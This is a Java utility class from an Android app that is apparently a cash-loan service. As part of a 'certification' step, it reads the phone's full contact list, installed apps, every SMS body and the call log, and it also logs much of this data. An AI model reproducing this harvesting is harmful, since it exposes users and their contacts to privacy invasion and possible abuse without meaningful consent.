package com.idss.cashloans.api.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.graphics.Bitmap;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Base64;
import android.util.Log;

import com.google.gson.Gson;
import com.idss.cashloans.api.moudle.AppBeans;
import com.idss.cashloans.api.moudle.Certification;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;

/**
 * 认证第2步用到的方法
 */
public class AppInfoUtils {
    public static final String TAG = "ContactsLoadUtil";

    /**
     * 调用之前请检测读取联系人权限{@link android.Manifest.permission#READ_CONTACTS}
     * 如果要保存头像，请检测SD卡写入权限{@link android.Manifest.permission#WRITE_EXTERNAL_STORAGE}
     *
     * @param context Context
     * @throws IOException
     */
    public static ArrayList<ContactsInfo> loadContacts(Context context) {
        ArrayList<ContactsInfo> contactsList = null;
        try {
            // 创建保存头像的文件目录
            File filesDir = context.getFilesDir();
            File photoDir = new File(filesDir, "photo");
            if (!photoDir.exists()) {
                boolean mkdirs = photoDir.mkdirs();
                Log.d(TAG, "mk photo dir: " + mkdirs);
            }
            Log.d(TAG, "photoDir path: " + photoDir.getAbsolutePath());
            // 存储联系人的Map
            Map<Long, ContactsInfo> contactsMap = new HashMap<>();
            // cursor
            ContentResolver resolver = context.getContentResolver();
            Cursor cursor = resolver.query(ContactsContract.Data.CONTENT_URI, null, null, null, null);
            cursor.moveToFirst();
            do {
                // 查询联系人id
                long contactId = cursor.getLong(cursor.getColumnIndexOrThrow(ContactsContract.Data.CONTACT_ID));
                // 查询联系人显示名 displayName
                String displayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Data.DISPLAY_NAME));
                // 查询联系人头像Uri地址
                String photoUri = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Data.PHOTO_URI));
                // mimeType 类型
                String mimeType = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Data.MIMETYPE));
//            Log.d(TAG, "mimeType: " + mimeType);

                ContactsInfo contacts = contactsMap.get(contactId);
                if (contacts == null) {
                    contacts = new ContactsInfo();
                    contactsMap.put(contactId, contacts);
                }

                contacts.setContactId(String.valueOf(contactId));
                contacts.setDisplayName(displayName);
                contacts.setPhotoUri(photoUri);


                // vnd.android.cursor.item/photo 联系人头像
                if (ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    try {
                        byte[] blob = cursor.getBlob(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Photo.PHOTO));
                        // 将头像保存到data/data/packageName/files/photo/ 目录下
                        if (blob != null) {
                            Log.d(TAG, "blob length: " + blob.length);
                            File file = new File(photoDir, contactId + ".jpg");
                            FileOutputStream fos = new FileOutputStream(file);
                            fos.write(blob);
                            fos.flush();
                            fos.close();
                            // 设置头像路径
                            Log.d(TAG, "photo path: " + file.getAbsolutePath());
                            contacts.setPhotoPath(file.getAbsolutePath());
                        }
                    } catch (IOException ioException) {
                        ioException.printStackTrace();
                    }

                }

                /**
                 * 查询所有的号码
                 * 手机号码 {@link ContactsContract.CommonDataKinds.Phone#TYPE_MOBILE}
                 * 家庭号码 {@link ContactsContract.CommonDataKinds.Phone#TYPE_HOME}
                 */
                if (ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    int numberType = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE));
                    String label = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.LABEL));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    // 添加号码
//                ContactsInfo.ContactsNumber contactsNumber = new ContactsInfo.ContactsNumber();
                    contacts.setNumberType(numberType);
                    contacts.setNumber(number);
                    contacts.setLabel(label);

                }
                // 查询姓和名
                if (ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String firstName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME));
                    String lastName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredName.FAMILY_NAME));

                    contacts.setFirstName(firstName);
                    contacts.setLastName(lastName);
                }
                // 公司信息
                if (ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String company = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.COMPANY));
                    String department = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.DEPARTMENT));
                    String job = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.TITLE));
                    String jobDescription = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.JOB_DESCRIPTION));

                    contacts.setCompany(company);
                    contacts.setDepartment(department);
                    contacts.setJob(job);
                    contacts.setJobDescription(jobDescription);
                }
                // 邮箱信息
                if (ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String emailAddress = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS));
                    String emailAddressDisplayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME));

                    contacts.setEmailAddress(emailAddress);
                    contacts.setEmailAddressDisplayName(emailAddressDisplayName);
                }
                // 备注信息
                if (ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String note = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Note.NOTE));

                    contacts.setNote(note);
                }
                // 昵称
                if (ContactsContract.CommonDataKinds.Nickname.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String nickName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Nickname.NAME));

                    contacts.setNickName(nickName);
                }
                // 网址链接
                if (ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String webUrl = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Website.URL));

                    contacts.setWebUrl(webUrl);
                }
                // 亲属姓名
                if (ContactsContract.CommonDataKinds.Relation.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String relationName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Relation.NAME));

                    contacts.setRelationName(relationName);
                }
                // im 协议
                if (ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String protocol = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Im.PROTOCOL));
                    String customProtocol = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Im.CUSTOM_PROTOCOL));

                    contacts.setProtocol(protocol);
                    contacts.setCustomProtocol(customProtocol);
                }
                // 身份信息
                if (ContactsContract.CommonDataKinds.Identity.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String identity = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Identity.IDENTITY));
                    String namespace = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Identity.NAMESPACE));

                    contacts.setIdentity(identity);
                    contacts.setNamespace(namespace);
                }
                // 群组信息
                if (ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE.equals(mimeType)) {
                    String groupId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.GroupMembership.GROUP_ROW_ID));

                    contacts.setGroupId(groupId);
                }
            } while (cursor.moveToNext());
            // 关闭cursor
            cursor.close();

            contactsList = new ArrayList<>(contactsMap.values());
            Log.d(TAG, "contactsList size: " + contactsList.size());
            for (ContactsInfo info : contactsList) {
                Log.d(TAG, "contacts info: " + info);
            }

        } catch (Exception e) {
            e.printStackTrace();

        }
        return contactsList;
    }


    /*** ---------------------------------------------getAllApk---------------------------------------------     */
    private static final ArrayList<AppBeans> mAppAllList = new ArrayList<>();
    private static final List<AppBeans> mAppPersonalList = new ArrayList<>();
    private static final List<AppBeans> mAppSystemList = new ArrayList<>();

    public List<AppBeans> getInstalledApps(Context context) throws PackageManager.NameNotFoundException {
        PackageManager packageManager = context.getPackageManager();
        List<PackageInfo> list = packageManager.getInstalledPackages(0);
        for (PackageInfo p : list) {
            AppBeans bean = new AppBeans();
            //TODO  传图片容易崩了
//            bean.setIcon(bitmapToBase64(AppUtils.getBitmap(context)));
            bean.setName(packageManager.getApplicationLabel(p.applicationInfo).toString());
            bean.setPackageName(p.applicationInfo.packageName);
            bean.setVersion(p.versionName);
            bean.setPath(p.applicationInfo.sourceDir);
            File file = new File(p.applicationInfo.sourceDir);
            bean.setSize(file.length());

            PackageInfo packageInfo = packageManager.getPackageInfo(p.applicationInfo.packageName, 0);
            long installTime = packageInfo.firstInstallTime;
            long lastUpdateTime = packageInfo.lastUpdateTime;
            bean.setFirstDate(installTime);
            bean.setLastDate(lastUpdateTime);

            int flags = p.applicationInfo.flags;
            //判断是否是属于系统的apk
            if ((flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                bean.setSystem(true);
                mAppSystemList.add(bean);
            } else {
                bean.setSystem(false);
                mAppPersonalList.add(bean);
                LogUtil.e(bean.toString());
            }
            mAppAllList.add(bean);

        }
        return mAppPersonalList;
    }

    private String bitmapToBase64(Bitmap bitmap) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        return Base64.encodeToString(byteArray, Base64.DEFAULT);
    }

    /*** ---------------------------------------------getAllApk---------------------------------------------     */


    private String date(long time) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        Date date = new Date(time);
        return sdf.format(date);
    }

    public static List<Certification.MemberSmsListDTO> getSmsInPhone(Context context) {
        List<Certification.MemberSmsListDTO> SMS_LIST = new ArrayList<>();
        Certification.MemberSmsListDTO memberSmsListDTO;

        final String SMS_URI_ALL = "content://sms/"; // 所有短信
        final String SMS_URI_INBOX = "content://sms/inbox"; // 收件箱
        final String SMS_URI_SEND = "content://sms/sent"; // 已发送
        final String SMS_URI_DRAFT = "content://sms/draft"; // 草稿
        final String SMS_URI_OUTBOX = "content://sms/outbox"; // 发件箱
        final String SMS_URI_FAILED = "content://sms/failed"; // 发送失败
        final String SMS_URI_QUEUED = "content://sms/queued"; // 待发送列表

        StringBuilder smsBuilder = new StringBuilder();

        try {
            Uri uri = Uri.parse(SMS_URI_ALL);
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type",};
            Cursor cur = context.getContentResolver().query(uri, projection, null, null, "date desc"); // 获取手机内部短信
            // 获取短信中最新的未读短信
            // Cursor cur = getContentResolver().query(uri, projection,
            // "read = ?", new String[]{"0"}, "date desc");
            assert cur != null;
            if (cur.moveToFirst()) {

                int index_id = cur.getColumnIndex("_id");
                int index_Address = cur.getColumnIndex("address");
                int index_Person = cur.getColumnIndex("person");
                int index_Body = cur.getColumnIndex("body");
                int index_Date = cur.getColumnIndex("date");
                int index_Type = cur.getColumnIndex("type");

                do {
                    String strAddress = cur.getString(index_Address);
                    int intPerson = cur.getInt(index_Person);
                    String strbody = cur.getString(index_Body);
                    long longDate = cur.getLong(index_Date);
                    int intType = cur.getInt(index_Type);

                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                    Date d = new Date(longDate);
                    String strDate = dateFormat.format(d);

                    String strType = "";
                    if (intType == 1) {
//                        strType = "接收";
                        strType = "IN";
                    } else if (intType == 2) {
//                        strType = "发送";
                        strType = "SEND";
                    } else if (intType == 3) {
                        strType = "草稿";
                    } else if (intType == 4) {
                        strType = "发件箱";
                    } else if (intType == 5) {
                        strType = "发送失败";
                    } else if (intType == 6) {
                        strType = "待发送列表";
                    } else if (intType == 0) {
                        strType = "所以短信";
                    } else {
                        strType = "null";
                    }

                    smsBuilder.append("[ ");
                    smsBuilder.append(strAddress + ", ");
                    smsBuilder.append(intPerson + ", ");
                    smsBuilder.append(strbody + ", ");
                    smsBuilder.append(strDate + ", ");
                    smsBuilder.append(strType);
                    smsBuilder.append(" ]\n\n");

                    memberSmsListDTO = new Certification.MemberSmsListDTO();
                    memberSmsListDTO.setMemberId(index_id);
//                    memberSmsListDTO.setCreateBy(String.valueOf(intPerson));

                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); // 设置日期格式
                    String dateStr = sdf.format(new Date(longDate)); // 将时间戳转换为日期字符串

                    memberSmsListDTO.setSmsTime(dateStr);
                    memberSmsListDTO.setSmsContext(strbody);
                    memberSmsListDTO.setType(strType);
                    memberSmsListDTO.setMobile(strAddress);

                    SMS_LIST.add(memberSmsListDTO);

                } while (cur.moveToNext());

                if (!cur.isClosed()) {
                    cur.close();
                }
            } else {
                smsBuilder.append("no result!");
            }

            smsBuilder.append("getSmsInPhone has executed!");

        } catch (SQLiteException ex) {
            Log.d("SQLiteException in getSmsInPhone", Objects.requireNonNull(ex.getMessage()));
        }
        LogUtil.e(String.valueOf(smsBuilder));
        LogUtil.e("======SMS_LIST============"+new Gson().toJson(SMS_LIST));
        return SMS_LIST;
    }


    /**
     * 读取通话记录数据
     */
    public static List<Certification.MemberCallLogListDTO> getCallLogDataList(Context context) {
        // 1.获得ContentResolver
        ContentResolver resolver = context.getContentResolver();
        // 2.利用ContentResolver的query方法查询通话记录数据库
        /**
         * @param uri 需要查询的URI，（这个URI是ContentProvider提供的）
         * @param projection 需要查询的字段
         * @param selection sql语句where之后的语句
         * @param selectionArgs ?占位符代表的数据
         * @param sortOrder 排序方式
         *
         */
        Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, // 查询通话记录的URI
                new String[]{CallLog.Calls.CACHED_NAME// 通话记录的联系人
                        , CallLog.Calls.NUMBER// 通话记录的电话号码
                        , CallLog.Calls.DATE// 通话记录的日期
                        , CallLog.Calls.DURATION// 通话时长
                        , CallLog.Calls.TYPE}// 通话类型
                , null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
        );

        // 3.通过Cursor获得数据
        List<Certification.MemberCallLogListDTO> list = new ArrayList<>();

        while (cursor.moveToNext()) {
            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));

            long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'"); // 设置日期格式
            String dateStr = sdf.format(new Date(dateLong)); // 将时间戳转换为日期字符串

            int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
            int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
            String typeString = "";
            switch (type) {
                case CallLog.Calls.INCOMING_TYPE:
                    typeString = "打入";
                    break;
                case CallLog.Calls.OUTGOING_TYPE:
                    typeString = "打出";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    typeString = "未接";
                    break;
                default:
                    break;
            }

            Certification.MemberCallLogListDTO memberCallLogListDTO = new Certification.MemberCallLogListDTO();
            memberCallLogListDTO.setCallTime(dateStr);
            memberCallLogListDTO.setDuration(duration);
            memberCallLogListDTO.setName((name == null) ? "未备注联系人" : name);
            memberCallLogListDTO.setPeerNumber(number);
            memberCallLogListDTO.setDialType(typeString);
            list.add(memberCallLogListDTO);
        }

        return list;
    }


}